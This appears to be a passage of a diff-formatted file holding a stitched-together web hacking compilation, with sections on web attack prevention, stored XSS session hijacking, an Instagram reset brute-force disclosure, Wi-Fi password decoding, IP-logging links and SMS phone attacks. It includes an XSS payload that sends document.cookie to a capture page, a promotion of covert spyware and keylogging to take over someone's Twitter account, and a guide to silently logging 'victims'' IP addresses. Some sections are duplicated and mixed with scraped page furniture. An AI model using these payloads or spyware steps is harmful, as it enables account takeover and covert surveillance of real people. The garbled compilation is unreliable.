+    \ They are much safer than traditional `SQL` statements\n*   **Denial of Service\
+    \ Attacks** – firewalls can be used to drop traffic from suspicious `IP` address\
+    \ if the attack is a simple DoS. Proper configuration of networks and Intrusion\
+    \ Detection System can also help reduce the chances of a DoS attack been successful.\n\
+    *   **Cross Site Scripting** – validating and sanitizing headers, parameters passed\
+    \ via the URL, form parameters and hidden values can help reduce XSS attacks.\n\
+    *   **Cookie/Session Poisoning** – this can be prevented by encrypting the contents\
+    \ of the cookies, timing out the cookies after some time, associating the cookies\
+    \ with the client `IP` address that was used to create them.\n*   **Form tempering**\
+    \ – this can be prevented by validating and verifying the user input before processing\
+    \ it.\n*   **Code Injection** - this can be prevented by treating all parameters\
+    \ as data rather than executable code. Sanitization and Validation can be used\
+    \ to implement this.\n*   **Defacement** – a good web application development\
+    \ security policy should ensure that it seals the commonly used vulnerabilities\
+    \ to access the web server. This can be a proper configuration of the operating\
+    \ system, web server software, and best security practices when developing web\
+    \ applications.\n\n### Website hacking tricks: Hack a Website online\n\nIn this\
+    \ website hacking practical scenario, we are going to hijack the user session\
+    \ of the web application located at `www.techpanda.org`. We will use cross site\
+    \ scripting to read the cookie session id then use it to impersonate a legitimate\
+    \ user session. The assumption made is that the attacker has access to the web\
+    \ application and he would like to hijack the sessions of other users that use\
+    \ the same application. The goal of this attack could be to gain admin access\
+    \ to the web application assuming the attacker’s access account is a limited one.\n\
+    \n#### Getting started\n\nOpen `http://www.techpanda.org/`\n\nFor practice purposes,\
+    \ it is strongly recommended to gain access using SQL Injection. Refer to this\
+    \ article for more information on how to do that. The login email is `admin@google.com`,\
+    \ the password is `Password2010`\n\nIf you have logged in successfully, then you\
+    \ will get the following dashboard\n\nClick on Add New Contact\n\nEnter the following\
+    \ as the first name\n\n```\n<a href=# onclick=\\\"document.location='http://techpanda.org/snatch_sess_id.php?c='+escape(document.cookie);\\\
+    \">Dark</a>\n```\n\nHERE, The above code uses `JavaScript`. It adds a hyperlink\
+    \ with an onclick event. When the unsuspecting user clicks the link, the event\
+    \ retrieves the `PHP` cookie session ID and sends it to the `snatch_sess_id.php`\
+    \ page together with the session id in the URL.\n\nEnter the remaining details\n\
+    \nClick on Save Changes\n\nSince the cross site script code is stored in the database,\
+    \ it will be loaded everytime the users with access rights login\n\nLet’s suppose\
+    \ the administrator logins and clicks on the hyperlink that says Dark\n\nHe/She\
+    \ will get the window with the session id showing in the URL.\n\nNote: the script\
+    \ could be sending the value to some remote server where the `PHPSESSID` is stored\
+    \ then the user redirected back to the website as if nothing happened.\n\nNote:\
+    \ the value you get may be different from the one in this webpage hacking tutorial,\
+    \ but the concept is the same.\n\n#### Session Impersonation using Firefox and\
+    \ Tamper Data add-on.\n\nThe flowchart below shows the steps that you must take\
+    \ to complete this exercise. You will need Firefox web browser for this section\
+    \ and Tamper Data add-on\n\n1.  Open Firefox and install the add.\n2.  Search\
+    \ for tamper data then click on install\n3.  Click on Accept and Install…\n4.\
+    \  Click on Restart now when the installation completes\n5.  Enable the menu bar\
+    \ in Firefox if it is not shown\n6.  Click on tools menu then select Tamper Data\n\
+    7.  You will get the following Window.\n    *   Note: If the Windows is not empty,\
+    \ hit the clear button\n8.  Click on Start Tamper menu\n9.  Switch back to Firefox\
+    \ web browser, type `http://www.techpanda.org/dashboard.php` then press the enter\
+    \ key to load the page\n10. You will get the following pop up from Tamper Data\n\
+    \    *   The pop-up window has three (3) options. The Tamper option allows you\
+    \ to modify the HTTP header information before it is submitted to the server.\n\
+    \    *   Click on it\n11. You will get the following window\n12. Copy the `PHP`\
+    \ session ID you copied from the attack URL and paste it after the equal sign.\n\
+    13. Your value should now look like this `PHPSESSID=2DVLTIPP2N8LDBN11B2RA76LM2`\n\
+    14. Click on OK button\n15. You will get the Tamper data popup window again\n\
+    16. Uncheck the checkbox that asks Continue Tampering?\n17. Click on submit button\
+    \ when done\n18. You should be able to see the dashboard\n    *   Note: we did\
+    \ not login, we impersonated a login session using the `PHPSESSID` value we retrieved\
+    \ using cross site scripting.\n\n## How any Instagram account could be hacked\
+    \ in less than 10 minutes\n\nA security researcher has been awarded $30,000 after\
+    \ discovering a serious vulnerability that could potentially have put any Instagram\
+    \ account at risk of being hacked. Following a recent increase in rewards offered\
+    \ for the discovery of critical account takeover vulnerabilities in Facebook and\
+    \ Instagram, Indian security researcher Laxman Muthiyah chose to take a close\
+    \ look at the photo-sharing service. As he describes in a blog post, Muthiyah\
+    \ explored whether there might be a vulnerability in how Instagram handled password\
+    \ reset requests for users who have forgotten their login credentials. Muthiyah\
+    \ found that when users asked for a password reset via Instagram’s web interface,\
+    \ the site would email a reset link to the user’s email account.\n\nA security\
+    \ researcher has been awarded $30,000 after discovering a serious vulnerability\
+    \ that could potentially have put any Instagram account at risk of being hacked.\
+    \ Following a recent increase in rewards offered for the discovery of critical\
+    \ account takeover vulnerabilities in Facebook and Instagram, Indian security\
+    \ researcher Laxman Muthiyah chose to take a close look at the photo-sharing service.\
+    \ As he describes in a blog post, Muthiyah explored whether there might be a vulnerability\
+    \ in how Instagram handled password reset requests for users who have forgotten\
+    \ their login credentials. Muthiyah found that when users asked for a password\
+    \ reset via Instagram’s web interface, the site would email a reset link to the\
+    \ user’s email account.\n\nAfter a few minutes of testing Muthiyah couldn’t find\
+    \ any bugs, and so turned his attention instead to how smartphone users recover\
+    \ access to their Instagram accounts. What Muthiyah found was that Instagram offered\
+    \ the option for users locked out of their accounts to request that a six-digit\
+    \ secret security code be sent to their mobile phone number or email account.\
+    \ If that passcode is entered, a user can regain access to their Instagram account.\
+    \ In theory, if a hacker could enter the six-digit security code they would be\
+    \ able to break into the Instagram account (and reset the password locking out\
+    \ the legitimate owner.) Now, that passcode could potentially be stolen if a hacker\
+    \ had somehow managed to gain access to their target’s email account, or had hijacked\
+    \ control of their victim’s mobile phone number via a SIM swap scam. But Muthiyah\
+    \ wondered if there might be another way to break into accounts if neither of\
+    \ those options were available.\n\nMuthiyah realised that all a hacker would need\
+    \ to do was enter the correct six digit code – a code that could be any combination\
+    \ between 000000 and 999999 – within the ten minute window Instagram would accept\
+    \ the code before expiring it. Up to one million numbers to be entered within\
+    \ ten minutes, in order to change an Instagram account’s password. Of course,\
+    \ the likes of Facebook and Instagram aren’t going to simply sit quietly as an\
+    \ automated script tries a brute force attack to guess the correct security code.\
+    \ Instead they have rate-limiting in place to detect when multiple attempts have\
+    \ been made to get past the security check and slow down subsequent attempts –\
+    \ meaning the ten minute window of opportunity expires. In Muthiyah’s tests he\
+    \ discovered that when he cycled through 1000 attempts to guess an Instagram account’s\
+    \ security codes, 250 of them went through and the subsequent 750 requests were\
+    \ rate limited. However, after a few days of testing the researcher was able to\
+    \ discover that Instagram’s rate limiting mechanism could be bypassed by rotating\
+    \ `IP` addresses (in other words, not using the same computer to brute force the\
+    \ recovery code) and sending concurrently from different `IP` addresses. Sending\
+    \ concurrent requests using multiple `IP`s allowed me to send a large number of\
+    \ requests without getting limited. The number of requests we can send is dependent\
+    \ on concurrency of `req`s and the number of `IP`s we use. Also, I realized that\
+    \ the code expires in 10 minutes, it makes the attack even harder, therefore we\
+    \ need 1000s of `IP`s to perform the attack.” Muthiyah says that he used 1000\
+    \ different machines and `IP`s to achieve easy concurrency, and sent 200,000 requests\
+    \ in his tests. He shared a YouTube video with Facebook and Instagram’s security\
+    \ team to demonstrate the attack in action: Of course, 200,000 requests isn’t\
+    \ quite the million requests that would be necessary to guarantee the correct\
+    \ recovery passcode would be entered to allow an Instagram account to be hijacked.\
+    \ Muthiyah’s investigation concludes that in a real attack, 5000 `IP` addresses\
+    \ would be needed to hack an Instagram account. Although that sounds like a large\
+    \ number, it can actually be easily achieved at a low price (Muthiyah says there\
+    \ would be approximately US $150 cost if a cloud provider like Google or Amazon\
+    \ was used). All Instagram users should be grateful that Laxman Muthiyah chose\
+    \ to responsibly disclose the security vulnerability to Instagram’s security team\
+    \ rather than monetise his discovery by selling it to online criminals. Its easy\
+    \ to imagine that a technique like this would be very attractive to many hackers\
+    \ interested in compromising Instagram accounts, and they might be prepared to\
+    \ pay much more than the $30,000 Muthiyah received in the form of a bug bounty.\
+    \ All internet users are reminded to better secure their online accounts with\
+    \ strong, unique passwords and to enable two-factor authentication wherever possible.\n\
+    \n## The Best Way to Hack A Twitter Account\n\nAfter a dozen unsuccessful hacker\
+    \ attempts, you feel nervous and irritated trying to hack into a Twitter account\
+    \ again and again. This is where special hacking software and keyloggers can help\
+    \ you complete the secret mission. PanSpy is such a powerful mobile phone tracking\
+    \ application that enables you to access someone's Twitter account secretly. This\
+    \ app can be used for many purposes as it has many features as compared to any\
+    \ other spy apps. You can use this application for hacking messages, location,\
+    \ contacts, call logs, Keylogger, Apps, E-mails and much more on any Android devices\
+    \ including Samsung, Huawei, HTC, Oppo, Sony, LG that is running on Android version\
+    \ 5.0 or later.\n\n### Why Choose This Tool to Hack A Twitter Account:\n\n*  \
+    \ **Track Cell Phone Activity:** Call logs, Messages, E-mails, Document, Calendar,\
+    \ Photo, Video, Apps and more\n*   **Track Current Location:** GPS, Geofencing,\
+    \ WiFi logger\n*   **Monitor Social Apps:** WhatsApp, Skype, Facebook, Instagram,\
+    \ Snapchat, Line, Kik, Tinder, Hangouts and more\n*   **Remote Control:** App\
+    \ blocker, Schedule restriction\n\n### Three Steps to Hack A Twitter Account\n\
+    \n#### Step 1: Subscribe PanSpy.\n\nCreate an account on PanSpy first by visiting\
+    \ PanSpy official website, click on Sign Up button. Use an authentic email address\
+    \ to sign up PanSpy. After successfully created a PanSpy account, it will send\
+    \ a confirmation link to your Email to activate your account, simply navigate\
+    \ to your Email address, tap the link to activate your account, then follow the\
+    \ Setup Wizard to finish the following setup process.\n\n#### Step 2: Select A\
+    \ Subscription and Install Application.\n\nSelect a subscription from the two\
+    \ editions: Premium Edition, Ultimate Edition. Both editions support for 1-month\
+    \ subscription, quarter subscription and 1-year subscription. After successfully\
+    \ subscribed the service, you will get a download link, simply download and setup\
+    \ the PanSpy app. Then login your PanSpy account, and follow the instructions\
+    \ given to set and give the app permission to access data on the monitored mobile\
+    \ phone. Once you completed all process and started the service, you can choose\
+    \ to delete the app icon or keep it on the home screen.\n\n#### Step 3: Start\
+    \ Hacking the Twitter Account.\n\nNow, turn back to computer Control Panel, you\
+    \ have complete unrestricted access to the phone and you can easily hack twitter\
+    \ account. To get the Twitter password, simply use PanSpy’s Keylogger feature.\
+    \ However, that's not it, you can also use it to hack Viber, Snapchat, WhatsApp,\
+    \ Line, WhatsApp, etc.\n\n## Accessing a wireless network\n\nAs you may know that\
+    \ a wireless network is a network that is connected without using any wires. These\
+    \ are the networks that use radio waves to link computers and other devices together.\
+    \ To access these networks you’ll need:\n\n*   A device that has wireless-network\
+    \ enabled (laptop, smartphone, etc.)\n*   The device as well as you will need\
+    \ to be within the transmission radius of a wireless network access point (a WiFi\
+    \ router)\n\nIf the network isn’t password protected then you wouldn’t need to\
+    \ do anything further to gain access except click on it. It was asking to get\
+    \ hacked. But if the network is password protected like most, then you’ll need\
+    \ its password to gain access.\n\n### Wireless Network Authentication WEP & WPA\n\
+    \nThere are many authentication techniques used in various wireless network devices.\
+    \ These include: `WEP`, `WPA`, `WPA2`, `WPA3`, `WPA2 + AES`, `WPA + AES`, `WPA\
+    \ + TKIP/AES`, `WPA + TKIP`, and more `WEP` and `WPA` are two of the most commonly\
+    \ used authentication techniques in a wireless network. Understanding these two\
+    \ is good for building a solid foundation before learning how to hack into a wireless\
+    \ network. It will also help you gather the required information regarding the\
+    \ access point.\n\n#### WEP\n\n`WEP` (Wired Equivalent Privacy) is a security\
+    \ algorithm for IEEE 802. It was developed with the intention to overcome the\
+    \ data confidentiality issues with the traditional wired connection. It gave better\
+    \ data protection by encrypting the data transmitted to avoid eavesdropping. `WEP`\
+    \ authentication works using two methods:\n\n*   **Open System Authentication\
+    \ (OSA)** – OSA helps you gain access to any `WEP` network as well as receive\
+    \ files that aren’t encrypted\n*   **Shared Key Authentication (SKA)** – SKA allows\
+    \ a computer equipped with a wireless modem to gain full access to any `WEP` network\
+    \ and exchange both encrypted and unencrypted data.\n\n#### WPA\n\nThe weaknesses\
+    \ found in `WEP` led to the development of Wi-Fi Protected Access. `WPA` became\
+    \ the security standard for computing devices with wireless internet connections.\
+    \ `WPA` encrypts data on 802.11 WLANs. In addition to this, instead of using the\
+    \ 24-bits that `WEP` uses, `WAP` uses 48bits that gives it higher initial values.\
+    \ However, `WPA` has been reported to get affected by a `DDoS` attack many times.\n\
+    \n### General types of attacks\n\n*   **Man-in-the-middle attack:** This refers\
+    \ to intercepting the communication between two individuals to steal data.\n*\
+    \   **Denial of service (`DDoS`):** To do this, you have to overwhelm the network\
+    \ with traffic. As a result, it cannot fulfill any requests, leaving the system\
+    \ unusable\n*   **Sniffing:** It involves intercepting data packets as they are\
+    \ transmitted over a network.\n\nIn addition to the above, there are various types\
+    \ of attacks that can compromise computer network security that can be useful\
+    \ in both types of hacking. Understanding these attacks will not only help you\
+    \ understand how to hack into a network but also learn cybersecurity. Moreover,\
+    \ it will also help you become an ethical hacker.\n\n### Tools used for hacking\
+    \ wireless networks\n\nTo be able to properly use and understand these tools,\
+    \ we recommend you develop a solid ethical hacking foundation as well as learn\
+    \ a few programming languages. Here’s a list of some of the most popular tools\
+    \ used to hamper computer network security:\n\n*   `Aircrack`\n*   `AirSnort`\n\
+    *   `Kismet`\n*   `Cain & Abel`\n*   `WireShark`\n*   `Fern WiFi Wireless Cracker`\n\
+    *   `CoWPatty`\n*   `Wifiphisher`\n*   `KisMac`\n*   `Reaver`\n\n### How to hack\
+    \ a wireless network\n\nFinally, let’s get into the step by step tutorial to decode\
+    \ the stored wireless network passwords.\n\n1.  Firstly, download `Cain & Abel`\
+    \ from the provided link\n2.  Secondly, ensure that you are in the range of a\
+    \ network that you wish to hack and try and connect.\n3.  Open `Cain & Abel`\n\
+    4.  Select the “Decoders” tab\n5.  From the navigation menu select “Wireless Passwords”\n\
+    6.  Tap on the plus sign (`+`) button\n7.  The decoder will show encryption type,\
+    \ `SSID` and the password that was once used to access the network.\n\n### Securing\
+    \ wireless networks\n\nNow that you know how to hack a WiFi network, it’s time\
+    \ to know about a few steps you can take to avoid someone hacking your WiFi. After\
+    \ all, you cannot become an ethical hacker without knowing how to hack and how\
+    \ to prevent a hack.\n\n*   Change the default passwords that come with the hardware\n\
+    *   Enable authentication mechanism\n*   Allowing only registered `MAC` addresses\
+    \ can restrict Access to the network.\n*   Using strong `WEP` and `WPA-PSK` keys\
+    \ as well as passwords with a combination of symbols, number and characters can\
+    \ reduce the chance of the keys being cracked by the use of a dictionary and brute\
+    \ force attacks\n*   Firewall Software can help reduce unauthorized access.\n\n\
+    ## How to hack IP addresses (proven way with steps)\n\nHow to hack `IP` addresses\
+    \ with a proven way (creating a logging website) Maybe someone scared you claiming\
+    \ to know your `IP` address. On the other hand, you could be the one trying to\
+    \ scare a friend by getting his `IP` address. Or, maybe, you just want to hear\
+    \ the truth about hacking `IP` address. Look no further, because in this guide\
+    \ we will give you all the truth. We will explain you how to hack `IP` addresses\
+    \ by following this agenda:\n\n*   A quick introduction to what `IP` addresses\
+    \ are\n*   How to hack `IP` addresses\n*   How hackers find out an `IP` address\n\
+    *   What can a hacker do when he knows your `IP` address\n\nAfter reading this\
+    \ guide, you will be able to find out the `IP` address of potentially anyone,\
+    \ silently.\n\n### Is this legal?\n\nUnder most circumstances, it is. Knowing\
+    \ someone’s `IP` address is part of a “normal” communication over the Internet,\
+    \ so there is no problem in doing that. However, if you use the `IP` address to\
+    \ violate someone else’s PC, you are committing a crime under many jurisdictions.\
+    \ We do not endorse such activity. Everything you read should be tried on systems\
+    \ you own and control personally. We are not responsible for your actions. Furthermore,\
+    \ remember that this is not legal advice. We are IT guys, not lawyers. If you\
+    \ are looking for legal advice it’s better to call your attorney.\n\n### Before\
+    \ Hack IP addresses\n\nBefore we start hacking, we should spend a few words on\
+    \ `IP` addresses. In IT, and in hacking specifically, never do anything without\
+    \ knowing what you are doing. Indeed, this concept is important here. A lot of\
+    \ people talk about “hack IP addresses” without even knowing what an `IP` address\
+    \ is. This can lead to unjustified fear among the ones being hacked or exaggerated\
+    \ glory among those who hack. What “hack an IP address” really mean? What can\
+    \ you do with that? Now, we are going to demystify IP address hacking.\n\n###\
+    \ What is an IP address?\n\nAn `IP` address is nothing more than a numeric identifier.\
+    \ It identifies a PC, smartphone, or any other device in a network, like the Internet.\
+    \ You can think of it like a snail mail address. If I know your snail mail address\
+    \ I know where you are, and I can send you some letters. With an `IP` address,\
+    \ I can know (roughly) where your device is, and send you some Internet traffic.\
+    \ In other words, you are identified by your `IP` address over the Internet. Typically,\
+    \ your Internet provider assigns a public `IP` address to your router in your\
+    \ house. When your devices in your home network want to send traffic over the\
+    \ Internet, they will use that public `IP` address (shared among all of them).\
+    \ The communication over the Internet happens with packets. Each piece of data\
+    \ is put in a packet, you can think of it as a letter. On the envelope, you always\
+    \ write source and destination `IP` addresses. The Internet will take care of\
+    \ delivering the packet to the right destination. Now, as you can see, if you\
+    \ send traffic out you will write your `IP` as source `IP`. This is the only way\
+    \ the other part can know it, and send some traffic back.\n\n### Do we really\
+    \ need to use our real IP address as source?\n\nOf course! Imagine you want to\
+    \ download a movie, see a web page, or anything else you do over the Internet.\
+    \ You contact a third-party server, which sends you the content you requested.\
+    \ It needs to know where to send it, so it needs to know your `IP`.\n\n### Am\
+    \ I in danger?\n\nIt depends, but in most cases, you aren’t. As from the paragraph\
+    \ above, knowing someone else’s `IP` is legitimate. You need it to send traffic\
+    \ back. What if your `IP` address ends up in the wrong hands? Just by knowing\
+    \ your `IP` address, nobody can harm you. However, they can start to scan your\
+    \ PC and see if you have vulnerabilities they can use to gain access to your data.\
+    \ We will get to that later.\n\n### How to find out someone’s IP address?\n\n\
+    In the following section, we are going to cover an out-of-the-box technique. However,\
+    \ it relies on a simple principle: your victim needs to send you some traffic.\
+    \ If he does that, boom, you have his `IP` address. Your PC already learns such\
+    \ an `IP` address, but it doesn’t show it to you. We will see how to see it.\n\
+    \n### The Proven Way to Hack IP addresses\n\n#### Some misconceptions and old\
+    \ techniques\n\nThe Internet is full of poor content about hacking `IP` addresses.\
+    \ You might read about hacking `IP` addresses with Skype and get excited about\
+    \ that, but since 2017 this is not possible anymore. So, for this article, we\
+    \ are going to use the best way to hack an `IP` address. We are going to use the\
+    \ only way that depends uniquely on you, not third-party services. Because of\
+    \ that, it will always work. Furthermore, it is simple to apply and easy to use.\n\
+    \n#### What’s behind our technique\n\nThe idea behind our technique is simple.\
+    \ You basically give your victim a link: they can open it with their mobile, PC,\
+    \ or any sort of device. On that link, they will see an image of your choice (we\
+    \ recommend using a fun one). However, your system will also track automatically\
+    \ their `IP` address and more information, like the browser they are using and\
+    \ their operating system. While this happens, they will see the fun image and\
+    \ have a laugh about it. They have no way of knowing that you are tracking their\
+    \ `IP` address.\n\n#### Step #1 – Register a website (for free!)\n\nYou want to\
+    \ give your victim a valid link to click, and it must be valid online. Therefore,\
+    \ we need to register a website. There are a lot of free services online to register\
+    \ a website, and among them, we have chosen x10 hosting. Go to their website and\
+    \ register a new account. As a first thing, they will ask you to select a domain\
+    \ image. Use a credible one for the kind of images you want to share. Continue\
+    \ with the registration and verify your email. Once you complete the process,\
+    \ you will end up on the homepage where you will have to create a website. Now\
+    \ you are going to say “Wait, I thought we already created that!”… well, sort\
+    \ of. Until now, we created the name. Now, we have to prepare the software running\
+    \ behind it.\n\n#### Step #2 – Creating the website itself\n\nThe home will look\
+    \ like the one below. From there, just click the green Add Website button on the\
+    \ top right. A quick wizard will open. From there, we have to tune a few items.\
+    \ Before everything else, select “Custom Website” website. Then, as a website\
+    \ name, write something that reminds the website, like its domain name. As the\
+    \ last thing, leave the address path empty. Then, click on Add Website. Create\
+    \ the website, then select “Continue to my website” on the next page. Congratulation,\
+    \ we are almost there!\n\n#### Step #3 – Download the IPFinder script\n\nNow your\
+    \ website is ready. All we need to do is uploading the script that will take care\
+    \ of saving `IP` addresses and delivering the images to the user. Fortunately,\
+    \ you don’t need to write that script on your own: instead, we did it for you.\
+    \ It uses a `PHP` file, three `HTAccess` files, and two folders. Our `IPFinder`\
+    \ script comes in a useful zip package that you can download for free by using\
+    \ the link below. Just click on it and download the zip file. Now that you have\
+    \ it, don’t even unzip it. We will do that on the website directly: move on to\
+    \ the next step.\n\n#### Step #4 – Upload the IPFinder Script\n\nFrom the website\
+    \ pages, select the File Manager option. This will open a new window that looks\
+    \ similar to Explorer in Windows. A website is just a collection of files on a\
+    \ public server. With this File Manager, you can have a look at those files. To\
+    \ them, we need to add our script. Once you are in the file manager, select Upload\
+    \ (1). This will open a new window, where you can click “Browse” and search for\
+    \ the file you downloaded. Select that compressed file (`ipfinder.zip`) and wait\
+    \ for the upload to complete. Then, close this window and click Reload (2) in\
+    \ the previous window. Now you should see a new file in the list, right below\
+    \ “cgi-bin”. This is our zipped package containing `IPFinder`, and we just need\
+    \ to extract it.\n\n#### Step #5 – Extract the IPFinder\n\nSelect the `ipfinder.zip`\
+    \ so that its background turns blue. Then, from the top menu, select Extract.\
+    \ A new window will pop-up. Just click on Extract File(s) without changing anything.\
+    \ Then, wait for the process to finish, and, as soon as it does, click the Close\
+    \ button. You will have some more files and folders on your list. In case you\
+    \ don’t, just hit the Reload button as we did previously. At this point, I recommend\
+    \ you to delete the `ipfinder.zip` file. You don’t need it anymore, as we have\
+    \ extracted its content. So, just click it and then click the delete button at\
+    \ the top. This step is not mandatory, but it is a good practice.\n\n#### Step\
+    \ #6 – Adding images\n\nOur `IPFinder` comes without images. However, it is a\
+    \ script that shows an image and logs the `IP` of the viewer. Therefore, you need\
+    \ to add your own images. So, find a `jpeg` image that you think would work for\
+    \ this purpose. At the moment, our script only supports `JPEG/JPG` images. Once\
+    \ you have that image, rename it with a simple name without spaces. Then, double-click\
+    \ on the images folder to view its content.\n\n### A quick introduction to what\
+    \ IP addresses are\n\n`ICTShore.com` Menu How to hack `IP` addresses (proven way\
+    \ with steps) Alessandro Maggio February 22, 2018 How to hack `IP` addresses with\
+    \ a proven way (creating a logging website) Share This Post Share on linkedin\
+    \ Share on facebook Share on twitter Share on email Maybe someone scared you claiming\
+    \ to know your `IP` address. On the other hand, you could be the one trying to\
+    \ scare a friend by getting his `IP` address. Or, maybe, you just want to hear\
+    \ the truth about hacking `IP` address. Look no further, because in this guide\
+    \ we will give you all the truth. We will explain you how to hack `IP` addresses\
+    \ by following this agenda: A quick introduction to what `IP` addresses are How\
+    \ to hack `IP` addresses How hackers find out an `IP` address What can a hacker\
+    \ do when he knows your `IP` address After reading this guide, you will be able\
+    \ to find out the `IP` address of potentially anyone, silently.\n\n### Is this\
+    \ legal?\n\nUnder most circumstances, it is. Knowing someone’s `IP` address is\
+    \ part of a “normal” communication over the Internet, so there is no problem in\
+    \ doing that. However, if you use the `IP` address to violate someone else’s PC,\
+    \ you are committing a crime under many jurisdictions. We do not endorse such\
+    \ activity. Everything you read should be tried on systems you own and control\
+    \ personally. We are not responsible for your actions. Furthermore, remember that\
+    \ this is not legal advice. We are IT guys, not lawyers. If you are looking for\
+    \ legal advice it’s better to call your attorney.\n\n### Before Hack IP addresses\n\
+    \nBefore we start hacking, we should spend a few words on `IP` addresses. In IT,\
+    \ and in hacking specifically, never do anything without knowing what you are\
+    \ doing. Indeed, this concept is important here. A lot of people talk about “hack\
+    \ IP addresses” without even knowing what an `IP` address is. This can lead to\
+    \ unjustified fear among the ones being hacked or exaggerated glory among those\
+    \ who hack. What “hack an IP address” really mean? What can you do with that?\
+    \ Now, we are going to demystify IP address hacking.\n\n### Step 7# – Using IPFinder\n\
+    \nNow your `IPFinder` is ready to go. How do we use it? It is very simple, as\
+    \ it automatically creates the URL we need. Your URL to share with your victims\
+    \ will be something like this one. In this URL, each part is customizable. The\
+    \ domain name is the name of your website, the one you selected when you created\
+    \ the account. You won’t be able to change this. In our case, this is “coolimages”.\
+    \ The image name is the name of the picture you uploaded, so in our case, this\
+    \ is “meme.jpg” The user ID is something you should select carefully. Here you\
+    \ can write any combination of letters and numbers you want. Now we will see how\
+    \ to use it\n\n#### Selecting the User ID\n\n`IPFinder` will save a new text file\
+    \ for each victim that sees the image in the log folder. That file contains the\
+    \ date, time, and the User ID you specify. The purpose of this field is to let\
+    \ you differentiate between users. Think about it, what if you want to give the\
+    \ link to multiple people? How can you know which `IP` corresponds to which person?\
+    \ You cant. With this approach, you would send to John the link to `/meme.jpg/john`\
+    \ and to Alice the link to `/meme.jpg/alice`. They will both see the same picture,\
+    \ but you will log their `IP`s separately.\n\n### Hack IP addresses, getting the\
+    \ results\n\nBrowse the log folder. You will see some text files with the names\
+    \ explained above. Open any of them and read their content (select it and click\
+    \ Edit). In each, you will see something like this.\n\n### What can you do with\
+    \ hacked IP addresses?\n\nAt this point, you have your `IP` finder in place. You\
+    \ shared some images, thus getting some `IP`. You can know truly hack `IP` addresses,\
+    \ but you are still wondering what can someone do with `IP` addresses. On the\
+    \ other hand, you might be the one who believes to be hacked, and you want to\
+    \ know if you are in real danger. Look no further, here we will tell you the ultimate\
+    \ truth about what happens after you hack `IP` addresses.\n\n#### Hack IP addresses\
+    \ to scare people\n\nA lot of self-proclaimed hackers hack `IP` addresses just\
+    \ to scare people. They contact the person and tell them they know their `IP`\
+    \ address, and maybe their browser. A normal PC user will believe they have accessed\
+    \ their PC, how would they know which browser they use otherwise? So, people get\
+    \ scared and start believing in the hacker. I’ve heard stories about “hackers”\
+    \ who managed to extort money from someone with this approach. They basically\
+    \ make them believe they had access to their data and threatened to share some\
+    \ personal pictures or something like that. The truth is, they didn’t even know\
+    \ if those pictures really existed. However, they approached everyone with the\
+    \ same words. As a result, they would scare the hell out of anyone holding such\
+    \ kind of pictures. Of course, such activity is illegal.\n\n#### Geolocating you\n\
+    \nIf you get someone’s `IP` address, you can geolocate it very approximately.\
+    \ The location will be a few square kilometers accurate in urban areas, and a\
+    \ few dozens square kilometers accurate in rural areas. This is a rule of thumb\
+    \ and might vary, but you will be never accurate enough. Only your service provider,\
+    \ and thus the police, can locate you precisely with your home address. For the\
+    \ others, you need to get by with only knowing the city or county.\n\n#### Truly\
+    \ gain access to the device or to personal data\n\nIf someone knows your `IP`\
+    \ address, he can scan you. This means he can try to detect the system you are\
+    \ running and your vulnerabilities. Now, since the public `IP` address of yours\
+    \ is on your home router, they will do that for your router. They will gain access\
+    \ to your router and, from that, they will adopt the same approach to gain access\
+    \ to your PC. This process is long and complex and requires a skilled hacker.\
+    \ However, it always follows the same guidelines.\n\n1.  Find exposed services\
+    \ (with `nmap`) and try to detect the hardware and software version with the `TCP`\
+    \ signature\n2.  Look for common exploits on the exposed services, or for that\
+    \ specific hardware/software\n3.  Try to gain access with brute force\n4.  Try\
+    \ to create a custom exploit\n\nOf course, the fourth step is so hard that many\
+    \ hackers will simply give up. That step if for someone with skills and budget\
+    \ that wants to hack specifically you.\n\n### How can I defend myself?\n\nIn many\
+    \ connections, rebooting your router will change your public `IP` address. That’s\
+    \ it. If a hacker was attacking you, they will have to find your `IP` again. Furthermore,\
+    \ you can increase the level of security by using a `VPN` or a proxy chain like\
+    \ `TOR`. In this case, you basically contact a server you trust (maybe own) somewhere\
+    \ on the Internet. Then, that server makes requests on the web for you. In case\
+    \ someone tracks your `IP` address, they will track the `IP` address of that server.\n\
+    \n## How to Hack a Smartphone\n\nMeir Machlin of Trust Digital demonstrates how\
+    \ to hack a smartphone using `SMS`. Machlin walked us through two hacks using\
+    \ basic tools available to anyone. Machlin's 'hacker tool kit' included a laptop\
+    \ with `WiFi` connectivity, and two phones. One phone acts as a `GSM` modem for\
+    \ the laptop, the other phone is Machlin's personal phone, which he used to receive\
+    \ information. A third phone served as our target device, the phone that was 'under\
+    \ attack' in the demonstration. The first attack we watched is known as a 'Midnight\
+    \ Raid,' because it is often pulled off during the night when the phone's user\
+    \ is asleep and the device is still turned on as it is charged, or simply left\
+    \ on the nightstand. Machlin sent a simple `SMS` which invoked Internet Explorer\
+    \ on the attack device. First, Machlin sent a graphic to the target phone that\
+    \ said \"You have been hacked\" to show just how quick and easy it is to get into\
+    \ another user's phone with `SMS`. In the second push, Machlin ran an application\
+    \ on the attacked phone that could retrieve data. The `SMS` came back to Machlin's\
+    \ phone with the attack phone's `INSI` number; the phone's unique ID. However,\
+    \ Machlin noted the application could have just as easily stolen a contact list,\
+    \ either personal or corporate. He said it was also possible in this scenario\
+    \ to push viruses to the device or even initiate a denial of service attack.\n\
+    \n## How to Hack a Smartphone, Part 2\n\nMeir Machlin of Trust Digital continues\
+    \ his demonstration of how to hack a smartphone. In the second demonstration (which\
+    \ you can view in \"How to Hack a Smartphone, Part 2\"), Machlin ran through a\
+    \ control message attack. In this kind of hack, a criminal can change the control\
+    \ settings of a device without the user having any knowledge. He showed us how\
+    \ he could easily uncheck `SSL`, leaving the device vulnerable with no encryption.\
+    \ As a finale, he pushed a wipe command, which removed all stored information\
+    \ from the device. The wipe, said Machlin, could also be pushed to all devices\
+    \ contained in a hacked phone's contact list. The attacks, according to Machlin,\
+    \ prove that texts can no longer be considered safe. And these kind’s of hacks\
+    \ are unique to smartphones because PCs don't have `SMS` capabilities, he said.\
+    \ Which smartphones are vulnerable to these kind’s of attacks? That varies widely\
+    \ depending on the security settings and practices in place for use of the device.\
+    \ Some contend that mobile devices still pose little security threat to an organization.\
+    \ In fact, in a recent hacking \"contest\" that took place in March, none of the\
+    \ smartphones slated for attack were compromised. However, a report from Gartner\
+    \ analyst John Girard predicts as wireless devices become more pervasive in the\
+    \ enterprise, the potential for security problems will increase. Machlin advised\
+    \ all smartphones that are under an organization's control be tightly monitored,\
+    \ patched and updated regularly to avoid users taking matters in their own hands.\n\
